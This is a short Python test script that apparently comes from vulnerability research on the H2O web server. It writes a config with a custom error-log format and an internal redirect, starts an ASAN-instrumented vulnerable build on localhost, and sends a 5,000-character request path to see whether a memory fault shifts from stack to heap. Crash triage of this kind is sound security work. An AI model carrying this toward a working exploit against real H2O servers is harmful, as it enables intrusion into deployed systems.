#!/usr/bin/env python3
"""Throwaway: test whether a small-reserve format moves the fault from stack to heap."""
import os
import socket
import subprocess
import time
import urllib.request

ROOT = "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell"
PORT = 17998
FORMAT = "%s %s %{error}x"
conf = f"{ROOT}/live/heap-sink.conf"
with open(conf, "w") as f:
    f.write(f"""listen:
  host: 127.0.0.1
  port: {PORT}
num-threads: 1
error-log: {ROOT}/live/heap-sink-error.log
hosts:
  default:
    access-log:
      path: {ROOT}/live/heap-sink-access.log
      format: '{FORMAT}'
    paths:
      /:
        redirect:
          status: 302
          internal: YES
          url: '//:'
""")
outpath = f"{ROOT}/live/heap-sink.out"
with open(outpath, "wb") as out:
    proc = subprocess.Popen(
        [f"{ROOT}/src/vuln/build-asan/h2o", "-c", conf],
        stdout=out, stderr=subprocess.STDOUT,
        env={**os.environ, "ASAN_OPTIONS": f"detect_leaks=0:abort_on_error=0:log_path={ROOT}/live/asan-heap-sink"},
    )
    for _ in range(100):
        try:
            s = socket.create_connection(("127.0.0.1", PORT), 0.2)
            s.close()
            break
        except OSError:
            time.sleep(0.1)
    else:
        print("SERVER_NOT_READY")
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{PORT}/" + "A" * 5000, timeout=10) as r:
            print("HTTP", r.status)
    except Exception as e:
        print("REQUEST_FAILED", repr(e))
    time.sleep(1)
    print("ALIVE", proc.poll() is None, "RC", proc.poll())
    if proc.poll() is None:
        proc.kill()
    proc.wait()
print("--- server output ---")
print(open(outpath, errors="replace").read()[:3000])
for p in (f"{ROOT}/live/asan-heap-sink.1", f"{ROOT}/live/asan-heap-sink.0"):
    if os.path.exists(p):
        print("--- asan report", p, "---")
        print(open(p, errors="replace").read()[:3000])
